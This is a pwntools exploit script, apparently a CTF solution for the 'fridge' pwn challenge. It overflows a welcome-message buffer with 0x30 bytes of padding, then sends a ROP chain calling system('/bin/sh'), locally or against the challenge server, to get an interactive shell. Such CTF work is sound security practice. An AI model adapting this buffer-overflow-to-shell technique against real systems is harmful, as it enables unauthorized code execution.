#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/0xfun-ctf/pwn/fridge/dist/vuln")

elf = context.binary = ELF(TARGET_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h"])


def get_stream():
    if "remote" in sys.argv:
        return remote("chall.0xfun.org", 6735)

    return process(TARGET_PATH)


def attach_gdb(r):
    if "debug" in sys.argv:
        bkps = []
        cmds = []

        gdbscript = ["break {}".format(x) for x in bkps] + cmds
        gdb.attach(r, "\n".join(gdbscript))


def set_welcome_message(r, msg):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b":\n", msg)


def exploit(r):
    rop = ROP(elf)
    rop.raw(b"A" * 0x30)
    rop.system(next(elf.search(b"/bin/sh\0")))

    set_welcome_message(r, rop.chain())
    r.interactive()


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
